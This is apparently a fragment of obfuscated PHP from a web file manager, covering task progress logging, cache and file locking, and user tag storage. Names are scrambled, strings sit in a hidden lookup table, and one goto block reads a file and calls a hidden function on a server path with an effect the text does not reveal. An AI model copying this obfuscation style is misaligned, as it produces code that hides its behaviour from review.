$æØ›—Ù˚ = curl_getinfo($∂€õ˘ßó); self::log($˚ø˛≤ÒÁ[1845] . $æØ›—Ù˚[$˚ø˛≤ÒÁ[392]]); self::valueSet($this->task[$˚ø˛≤ÒÁ[483]], $this->task); } public function progressEnd($¬ûüâáã) { $Íﬁ˛Ÿ® =& $_SERVER[ß⁄ˆÇ†Œ]; self::log($Íﬁ˛Ÿ®[1846] . $this->task[$Íﬁ˛Ÿ®[483]]); $this->end(); } public function progress($˙Ôæ™∆à, $ô‹äÏŒ≥, $‹Îé›∆Á, $ï¯Ïî«∆, $©ÂîÁéî) { $¬∆ëÎÙë =& $_SERVER[ß⁄ˆÇ†Œ]; $—ÚÚÌòÓ =& $this->task; if ($©ÂîÁéî > 0) { $—ÚÚÌòÓ[$¬∆ëÎÙë[1137]] = $—ÚÚÌòÓ[$¬∆ëÎÙë[1137]] == 0 ? $ï¯Ïî«∆ : $—ÚÚÌòÓ[$¬∆ëÎÙë[1137]]; $—ÚÚÌòÓ[$¬∆ëÎÙë[1765]] = $©ÂîÁéî; } else { if ($‹Îé›∆Á > 0) { $—ÚÚÌòÓ[$¬∆ëÎÙë[1137]] = $—ÚÚÌòÓ[$¬∆ëÎÙë[1137]] == 0 ? $ô‹äÏŒ≥ : $—ÚÚÌòÓ[$¬∆ëÎÙë[1137]]; $—ÚÚÌòÓ[$¬∆ëÎÙë[1765]] = $‹Îé›∆Á; } } $this->update(); self::log("\x70\162\x6f\147\x72\145\x73\x73\110\164\164\x70\x3a\144\157\x77\156\72{$‹Îé›∆Á}\57{$ô‹äÏŒ≥}\73\x20\x75\160\154\x6f\x61\x64\72{$©ÂîÁéî}\57{$ï¯Ïî«∆}\x3b"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($è’ÿÅ◊«, $≠¢ºÎÄË = '', $¸ª∆êÕê = 0, $‡‹œ˙‰ = '') { $πë»çº— =& $_SERVER[ß⁄ˆÇ†Œ]; $‡‹œ˙‰ = $‡‹œ˙‰ ? $‡‹œ˙‰ : ($≠¢ºÎÄË ? $≠¢ºÎÄË : $è’ÿÅ◊«); $∆±¯ùû¬ = new Task($è’ÿÅ◊«, $≠¢ºÎÄË, $¸ª∆êÕê, $‡‹œ˙‰); $GLOBALS[$πë»çº—[1847] . $è’ÿÅ◊«] = new TaskLog($πë»çº—[1748], $∆±¯ùû¬, $‡‹œ˙‰); return $∆±¯ùû¬; } public function __construct($ÎôﬁëÀÇ = '', $Ä›ªÃ˜Ø = '', $√¶ë°ŒÜ = '') { $–ı¡œÀ⁄ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$ÎôﬁëÀÇ) { $ÎôﬁëÀÇ = $–ı¡œÀ⁄[1748]; } $ÎÑÔ«‰… = $ÎôﬁëÀÇ . $–ı¡œÀ⁄[470] . rand_string(10); if (!$√¶ë°ŒÜ) { $√¶ë°ŒÜ = $ÎôﬁëÀÇ . $–ı¡œÀ⁄[53] . $√¶ë°ŒÜ; } switch ($ÎôﬁëÀÇ) { case $–ı¡œÀ⁄[1748]: if (!$Ä›ªÃ˜Ø || !$Ä›ªÃ˜Ø->task) { return echoLog($ÎôﬁëÀÇ . $–ı¡œÀ⁄[1848]); } $Îäœ˚ïú = $Ä›ªÃ˜Ø; $ÎÑÔ«‰… = $Îäœ˚ïú->task[$–ı¡œÀ⁄[483]]; $ÎôﬁëÀÇ = $Îäœ˚ïú->task[$–ı¡œÀ⁄[483]]; if (!$Îäœ˚ïú->task[$–ı¡œÀ⁄[1653]]) { $Îäœ˚ïú->task[$–ı¡œÀ⁄[1653]] = $√¶ë°ŒÜ ? $√¶ë°ŒÜ : $ÎôﬁëÀÇ; } break; case $–ı¡œÀ⁄[1849]: if (!$Ä›ªÃ˜Ø) { return echoLog($ÎôﬁëÀÇ . $–ı¡œÀ⁄[1850]); } $ »œ‚åÿ = is_string($Ä›ªÃ˜Ø) ? array($Ä›ªÃ˜Ø) : $Ä›ªÃ˜Ø; $Îäœ˚ïú = new TaskFileTransfer($ÎÑÔ«‰…, $ÎôﬁëÀÇ, 0, $√¶ë°ŒÜ ? $√¶ë°ŒÜ : $ »œ‚åÿ[0]); foreach ($ »œ‚åÿ as $«‹çÖÑ÷) { $Îäœ˚ïú->addPath($«‹çÖÑ÷); } break; case $–ı¡œÀ⁄[398]: if (!$Ä›ªÃ˜Ø) { return echoLog($ÎôﬁëÀÇ . $–ı¡œÀ⁄[1850]); } $ »œ‚åÿ = is_string($Ä›ªÃ˜Ø) ? array($Ä›ªÃ˜Ø) : $Ä›ªÃ˜Ø; $Îäœ˚ïú = new TaskZip($ÎÑÔ«‰…, $ÎôﬁëÀÇ, 0, $√¶ë°ŒÜ ? $√¶ë°ŒÜ : $ »œ‚åÿ[0]); foreach ($ »œ‚åÿ as $«‹çÖÑ÷) { $Îäœ˚ïú->addPath($«‹çÖÑ÷); } break; case $–ı¡œÀ⁄[1295]: if (!$Ä›ªÃ˜Ø) { return echoLog($ÎôﬁëÀÇ . $–ı¡œÀ⁄[1850]); } $Îäœ˚ïú = new TaskUnZip($ÎÑÔ«‰…, $ÎôﬁëÀÇ, 0, $√¶ë°ŒÜ ? $√¶ë°ŒÜ : $Ä›ªÃ˜Ø); if ($Ä›ªÃ˜Ø) { $Îäœ˚ïú->addFile($Ä›ªÃ˜Ø); } break; case $–ı¡œÀ⁄[152]: $Îäœ˚ïú = new TaskHttp($ÎÑÔ«‰…, $ÎôﬁëÀÇ); break; default: return; break; } $this->task = $Îäœ˚ïú; $this->taskID = $ÎÑÔ«‰…; Hook::bind($–ı¡œÀ⁄[1785], array($this, $–ı¡œÀ⁄[1851])); Hook::bind($–ı¡œÀ⁄[1787], array($this, $–ı¡œÀ⁄[1852])); Hook::bind($–ı¡œÀ⁄[1781], array($this, $–ı¡œÀ⁄[1853])); echoLog($–ı¡œÀ⁄[1854] . $Îäœ˚ïú->task[$–ı¡œÀ⁄[1653]]); } public function __destruct() { $this->end(); } public function end($Á≥∂¥áº = '') { $Ÿ√ÜÁÚ∆ =& $_SERVER[ß⁄ˆÇ†Œ]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($Á≥∂¥áº); $this->task = !1; $this->taskID = !1; Hook::unbind($Ÿ√ÜÁÚ∆[1785], array($this, $Ÿ√ÜÁÚ∆[1851])); Hook::unbind($Ÿ√ÜÁÚ∆[1787], array($this, $Ÿ√ÜÁÚ∆[1852])); Hook::unbind($Ÿ√ÜÁÚ∆[1781], array($this, $Ÿ√ÜÁÚ∆[1853])); } public function taskUpdate($·ìÀ†Õ∆) { $ÃñµÛæé =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$·ìÀ†Õ∆ || $this->taskID != $·ìÀ†Õ∆[$ÃñµÛæé[483]]) { return; } $∂†’ƒ√¸ = 20; $≤û‚ËΩÁ = intval($·ìÀ†Õ∆[$ÃñµÛæé[1766]] * $∂†’ƒ√¸); $¸õóí◊¶ = $ÃñµÛæé[176] . str_repeat($ÃñµÛæé[958], $≤û‚ËΩÁ) . $ÃñµÛæé[1088] . str_repeat($ÃñµÛæé[53], $∂†’ƒ√¸ - $≤û‚ËΩÁ) . $ÃñµÛæé[178]; $äâªØ˛ = $¸õóí◊¶ . sprintf($ÃñµÛæé[1855], $·ìÀ†Õ∆[$ÃñµÛæé[1766]] * 100) . $ÃñµÛæé[1856]; $§Á‚‰˘¬ = $äâªØ˛ . $·ìÀ†Õ∆[$ÃñµÛæé[1765]] . $ÃñµÛæé[8] . $·ìÀ†Õ∆[$ÃñµÛæé[1137]] . LNG($ÃñµÛæé[1857]); $õ˛Ûû˚ = $ÃñµÛæé[12]; if ($·ìÀ†Õ∆[$ÃñµÛæé[1841]]) { $§Á‚‰˘¬ = $äâªØ˛ . size_format($·ìÀ†Õ∆[$ÃñµÛæé[1765]]) . $ÃñµÛæé[8] . size_format($·ìÀ†Õ∆[$ÃñµÛæé[1137]]); $õ˛Ûû˚ = size_format($·ìÀ†Õ∆[$ÃñµÛæé[1767]]) . $ÃñµÛæé[1858]; } if ($·ìÀ†Õ∆[$ÃñµÛæé[1139]]) { $·ìÀ†Õ∆[$ÃñµÛæé[1815]] = $·ìÀ†Õ∆[$ÃñµÛæé[1139]] . $ÃñµÛæé[53] . $·ìÀ†Õ∆[$ÃñµÛæé[1815]]; } if ($·ìÀ†Õ∆[$ÃñµÛæé[1815]]) { $ªí€ÎÛä = $ÃñµÛæé[12]; if ($·ìÀ†Õ∆[$ÃñµÛæé[1817]]) { $ªí€ÎÛä = $ÃñµÛæé[50] . size_format($·ìÀ†Õ∆[$ÃñµÛæé[1818]]) . $ÃñµÛæé[8] . size_format($·ìÀ†Õ∆[$ÃñµÛæé[1817]]); } $õ˛Ûû˚ .= $·ìÀ†Õ∆[$ÃñµÛæé[1815]] . $ªí€ÎÛä; } if ($·ìÀ†Õ∆[$ÃñµÛæé[836]] && !$·ìÀ†Õ∆[$ÃñµÛæé[1817]]) { $õ˛Ûû˚ .= $ÃñµÛæé[53] . size_format($·ìÀ†Õ∆[$ÃñµÛæé[1822]]) . $ÃñµÛæé[8] . size_format($·ìÀ†Õ∆[$ÃñµÛæé[836]]); } echoLog($§Á‚‰˘¬ . $ÃñµÛæé[53] . $õ˛Ûû˚, !0); } public function taskEnd($Ô‹õöâ–) { $™‘Öãïï =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$Ô‹õöâ– || $this->taskID != $Ô‹õöâ–[$™‘Öãïï[483]]) { return; } $µ…®ÑŸ› = $Ô‹õöâ– ? $Ô‹õöâ–[$™‘Öãïï[1765]] . $™‘Öãïï[8] . $Ô‹õöâ–[$™‘Öãïï[1137]] . LNG($™‘Öãïï[1857]) . $™‘Öãïï[74] : $™‘Öãïï[12]; echoLog($™‘Öãïï[1859] . $Ô‹õöâ–[$™‘Öãïï[1653]] . ($Ô‹õöâ–[$™‘Öãïï[534]] ? $™‘Öãïï[74] . $Ô‹õöâ–[$™‘Öãïï[534]] : $™‘Öãïï[12]) . $™‘Öãïï[74] . $µ…®ÑŸ› . $™‘Öãïï[1860] . sprintf($™‘Öãïï[924], timeFloat() - $Ô‹õöâ–[$™‘Öãïï[1768]]) . $™‘Öãïï[1780]); $this->end(); } public function taskKill($ΩØéÓ√∫) { $È«íÛﬂè =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$ΩØéÓ√∫ || $this->taskID != $ΩØéÓ√∫[$È«íÛﬂè[483]]) { return; } echoLog($È«íÛﬂè[1861] . $ΩØéÓ√∫[$È«íÛﬂè[1653]]); } } $_file = $_SERVER[$_SERVER[ß⁄ˆÇ†Œ][322]]; goto b¯´¥¢Òåû; dÑ›≠èÒÃá: if ($_SERVER[$_SERVER[ß⁄ˆÇ†Œ][321]] != $_SERVER[$_SERVER[ß⁄ˆÇ†Œ][913]]) { $_getc = $_SERVER[ß⁄ˆÇ†Œ][323]; $_getfile = $_SERVER[$_SERVER[ß⁄ˆÇ†Œ][324]] . $_SERVER[ß⁄ˆÇ†Œ][325]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ß⁄ˆÇ†Œ][262], $_getfilec); if (count($_getarrs) < $_SERVER[ß⁄ˆÇ†Œ][326]) { $exit = $_SERVER[ß⁄ˆÇ†Œ][327]; $exit(); } $_act = $_SERVER[ß⁄ˆÇ†Œ][328]; $_act($_SERVER[$_SERVER[ß⁄ˆÇ†Œ][322]]); } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $åß—Æ˚‹ =& $_SERVER[ß⁄ˆÇ†Œ]; if (self::$handle) { return self::$handle; } $¢›¸å—‡ = $GLOBALS[$åß—Æ˚‹[6]][$åß—Æ˚‹[434]]; self::$timeout = $¢›¸å—‡[$åß—Æ˚‹[914]] ? $¢›¸å—‡[$åß—Æ˚‹[914]] : 10; $í∆É˘É• = _get($GLOBALS[$åß—Æ˚‹[6]], $åß—Æ˚‹[915]); $°ë…Ìáä = $¢›¸å—‡[$åß—Æ˚‹[899]] ? $¢›¸å—‡[$åß—Æ˚‹[899]] : $åß—Æ˚‹[230]; if ($°ë…Ìáä == $åß—Æ˚‹[21] && $í∆É˘É• == $åß—Æ˚‹[13]) { $°ë…Ìáä = $åß—Æ˚‹[230]; } switch ($°ë…Ìáä) { case $åß—Æ˚‹[902]: self::$handle = new CacheLockRedis(); break; case $åß—Æ˚‹[903]: self::$handle = new CacheLockMemcached(); break; case $åß—Æ˚‹[21]: self::$handle = new CacheLockDatabase(); break; case $åß—Æ˚‹[230]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($åß—Æ˚‹[916], $åß—Æ˚‹[917]); } return self::$handle; } private static function key($áÛ…˘ÎÎ) { return $_SERVER[ß⁄ˆÇ†Œ][918] . Cache::key($áÛ…˘ÎÎ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($Õ◊Ä∆È≤ = '') { self::$errorMsg = $Õ◊Ä∆È≤; } public static function lockGlobal($Ú™˝›Ñá, $˛¸Õ¶ÔÇ) { return self::lock($Ú™˝›Ñá, $˛¸Õ¶ÔÇ, !0); } public static function lock($‘óåÆ´÷, $âêÛÄÀÔ = false, $Ùóøô Ò = false) { $£—ñÑ©Î =& $_SERVER[ß⁄ˆÇ†Œ]; $Á–¡ÍÚæ = self::init(); $¨Œ ›Ñ® = self::key($‘óåÆ´÷); $âêÛÄÀÔ = $âêÛÄÀÔ ? $âêÛÄÀÔ : self::$timeout; $›„∫¢£‚ = timeFloat(); $˛ô¶∞–ÿ = $Á–¡ÍÚæ->lock($¨Œ ›Ñ®, $âêÛÄÀÔ); $”˙äÅ˜„ = timeFloat(); if (!$˛ô¶∞–ÿ) { $ªÜñ—˝Ø = "\154\157\143\153\40\x65\x72\162\x6f\162\x3b\153\x65\x79\x3d{$‘óåÆ´÷}\73\164\x69\x6d\145\75{$âêÛÄÀÔ}\73" . self::$errorMsg . $£—ñÑ©Î[74] . get_caller_msg(); $⁄÷∏˚Ú¶ = LNG($£—ñÑ©Î[919]) . "\50{$âêÛÄÀÔ}\x73\51\x2e" . LNG($£—ñÑ©Î[920]); $⁄÷∏˚Ú¶ .= $£—ñÑ©Î[921]; if (is_string(self::$errorMsg) && self::$errorMsg) { $⁄÷∏˚Ú¶ = $⁄÷∏˚Ú¶ . $£—ñÑ©Î[922] . self::$errorMsg; } write_log($£—ñÑ©Î[923] . sprintf($£—ñÑ©Î[924], timeFloat() - $›„∫¢£‚) . $£—ñÑ©Î[925] . $ªÜñ—˝Ø . $£—ñÑ©Î[926] . error_get_last(), $£—ñÑ©Î[917]); show_json($⁄÷∏˚Ú¶, !1); } if (!$Ùóøô Ò) { self::$lockItem[$¨Œ ›Ñ®] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $»çúõæ… = number_format(timeFloat() - $”˙äÅ˜„, 3); write_log($£—ñÑ©Î[927] . $‘óåÆ´÷ . $£—ñÑ©Î[928] . $»çúõæ…, $£—ñÑ©Î[917]); } return $˛ô¶∞–ÿ; } public static function lockGet($ëÇ√€∂°) { $Á∏»è©Å = self::key($ëÇ√€∂°); if (self::$lockItem[$Á∏»è©Å]) { return self::$lockItem[$Á∏»è©Å]; } return self::init()->lockGet($Á∏»è©Å); } public static function unlock($¨ëú–ï¬) { $‘∏òÉßé =& $_SERVER[ß⁄ˆÇ†Œ]; $—∏Îóµñ = self::key($¨ëú–ï¬); self::$lockItem[$—∏Îóµñ] = null; self::init()->unlock($—∏Îóµñ); if (GLOBAL_DEBUG_LOG_ALL) { write_log($‘∏òÉßé[929] . $¨ëú–ï¬, $‘∏òÉßé[917]); } return; } public static function unlockRuntime() { $´‹ﬂó◊Ω =& $_SERVER[ß⁄ˆÇ†Œ]; $ïô‹£Î… = self::init(); $Ñ∆≥ÎÚ„ = !1; foreach (self::$lockItem as $íÆØ˙∞Ü => $ºÂõÆé¿) { if (!$ºÂõÆé¿) { continue; } $ïô‹£Î…->unlock($íÆØ˙∞Ü); if (!$Ñ∆≥ÎÚ„) { $Ñ∆≥ÎÚ„ = !0; write_log($´‹ﬂó◊Ω[930] . $íÆØ˙∞Ü . $´‹ﬂó◊Ω[74] . get_caller_msg(), $´‹ﬂó◊Ω[917]); continue; } write_log($´‹ﬂó◊Ω[930] . $íÆØ˙∞Ü, $´‹ﬂó◊Ω[917]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $˙˝ÚÙ∫¢ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($´‹ﬂó◊Ω[931] . $˙˝ÚÙ∫¢ . $´‹ﬂó◊Ω[932] . ACTION, $´‹ﬂó◊Ω[917]); } } public static function fileLock($Áüáπö∆) { $ñ«Ä¥˝œ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$GLOBALS[$ñ«Ä¥˝œ[933]]) { $GLOBALS[$ñ«Ä¥˝œ[933]] = array(); } $GLOBALS[$ñ«Ä¥˝œ[933]][$Áüáπö∆] = !1; $†Çîä€∞ = fopen(DATA_PATH . $Áüáπö∆ . $ñ«Ä¥˝œ[934], $ñ«Ä¥˝œ[935]); if (!$†Çîä€∞) { return !1; } $GLOBALS[$ñ«Ä¥˝œ[933]][$Áüáπö∆] = $†Çîä€∞; if (flock($†Çîä€∞, LOCK_EX)) { return !0; } self::unlock($Áüáπö∆); show_json($ñ«Ä¥˝œ[936], !1); return !1; } public static function fileUnlock($ÜÌÚÇ†§) { $Õﬂõäÿ =& $_SERVER[ß⁄ˆÇ†Œ]; $ﬁ≤õÙ˚¢ = $GLOBALS[$Õﬂõäÿ[933]][$ÜÌÚÇ†§]; if (!$ﬁ≤õÙ˚¢) { return; } $GLOBALS[$Õﬂõäÿ[933]][$ÜÌÚÇ†§] = !1; flock($ﬁ≤õÙ˚¢, LOCK_UN); fclose($ﬁ≤õÙ˚¢); } public static function fileUnlockAll() { $ç®∑√ßè =& $_SERVER[ß⁄ˆÇ†Œ]; if (!isset($GLOBALS[$ç®∑√ßè[933]]) || !$GLOBALS[$ç®∑√ßè[933]]) { return; } foreach ($GLOBALS[$ç®∑√ßè[933]] as $ £√ÎÀÅ => $ÑòÀ⁄»—) { if (!$ÑòÀ⁄»—) { continue; } $GLOBALS[$ç®∑√ßè[933]][$ £√ÎÀÅ] = !1; flock($ÑòÀ⁄»—, LOCK_UN); fclose($ÑòÀ⁄»—); } $GLOBALS[$ç®∑√ßè[933]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto a˜ÿ˜∫ëç§; déäΩ‹¥¨: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\145\162\137\x66\141\166"; protected function cacheFunctionAlias($“¬≤Å∏…) { $ù„ß«˙Ö =& $_SERVER[ß⁄ˆÇ†Œ]; return array($ù„ß«˙Ö[2078] => array($ù„ß«˙Ö[2493] . USER_ID, $ù„ß«˙Ö[2079])); } protected function listData() { $ÆÅ¶ÏÍö =& $_SERVER[ß⁄ˆÇ†Œ]; $¨˜ƒü∑È = array($ÆÅ¶ÏÍö[1755] => USER_ID, $ÆÅ¶ÏÍö[565] => array($ÆÅ¶ÏÍö[2082], 0)); $áèª◊ò£ = $ÆÅ¶ÏÍö[2494]; $°‚⁄ëÑ¢ = $this->field($áèª◊ò£)->where($¨˜ƒü∑È)->order($ÆÅ¶ÏÍö[2085])->select(); return $°‚⁄ëÑ¢ ? $°‚⁄ëÑ¢ : array(); } protected function addToTag($øÙËúï‹, $€Ö”˝‰è) { $îû°âˆ’ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!Model($îû°âˆ’[2229])->listData($€Ö”˝‰è)) { return !1; } if (is_numeric($øÙËúï‹)) { $…Œ«î€° = Model($îû°âˆ’[897])->pathInfo($øÙËúï‹); if (!$…Œ«î€°) { return !1; } } else { $…Œ«î€° = IO::infoSimple($øÙËúï‹); if (!$…Œ«î€°) { return !1; } $ú≥Ô®ÕË = $…Œ«î€°[$îû°âˆ’[32]]; $µ∞†ÛºÕ = $…Œ«î€°[$îû°âˆ’[33]]; if (isset($…Œ«î€°[$îû°âˆ’[493]])) { $µ∞†ÛºÕ = $…Œ«î€°[$îû°âˆ’[493]] == $îû°âˆ’[91] ? $îû°âˆ’[78] : $îû°âˆ’[230]; } } $ÎÙØ ™¶ = array($îû°âˆ’[1755] => USER_ID, $îû°âˆ’[565] => $€Ö”˝‰è, $îû°âˆ’[503] => $øÙËúï‹, $îû°âˆ’[504] => $µ∞†ÛºÕ ? $µ∞†ÛºÕ : $îû°âˆ’[498], $îû°âˆ’[502] => $ú≥Ô®ÕË ? $ú≥Ô®ÕË : $îû°âˆ’[12], $îû°âˆ’[1967] => 0); if ($this->where($ÎÙØ ™¶)->find()) { return !1; } return $this->add($ÎÙØ ™¶); } protected function removeFromTag($˜éñ∏∑ô, $íÖ¥√∂Ï) { $«–Àƒµ’ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!Model($«–Àƒµ’[2229])->listData($íÖ¥√∂Ï)) { return !1; } if (is_array($˜éñ∏∑ô)) { $˜éñ∏∑ô = array($«–Àƒµ’[7], $˜éñ∏∑ô); } $»ÒèÀÏ¨ = array($«–Àƒµ’[1755] => USER_ID, $«–Àƒµ’[565] => $íÖ¥√∂Ï, $«–Àƒµ’[503] => $˜éñ∏∑ô); return $this->where($»ÒèÀÏ¨)->delete(); } protected function removeByTag($ùµ°ÊŒ£) { $ø˘Ô©¡¸ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$ùµ°ÊŒ£) { return !1; } $øßÍÍ±∞ = array($ø˘Ô©¡¸[1755] => USER_ID, $ø˘Ô©¡¸[565] => $ùµ°ÊŒ£); return $this->where($øßÍÍ±∞)->delete(); } protected function removeBySource($∆‹ã÷ã°) { $≈ÍïÜ≈Ç =& $_SERVER[ß⁄ˆÇ†Œ]; if (is_array($∆‹ã÷ã°)) { $∆‹ã÷ã° = array($≈ÍïÜ≈Ç[7], $∆‹ã÷ã°); } $œãºÛ©– = array($≈ÍïÜ≈Ç[1755] => USER_ID, $≈ÍïÜ≈Ç[565] => array($≈ÍïÜ≈Ç[1088], 0), $≈ÍïÜ≈Ç[503] => $∆‹ã÷ã°); return $this->where($œãºÛ©–)->delete(); } }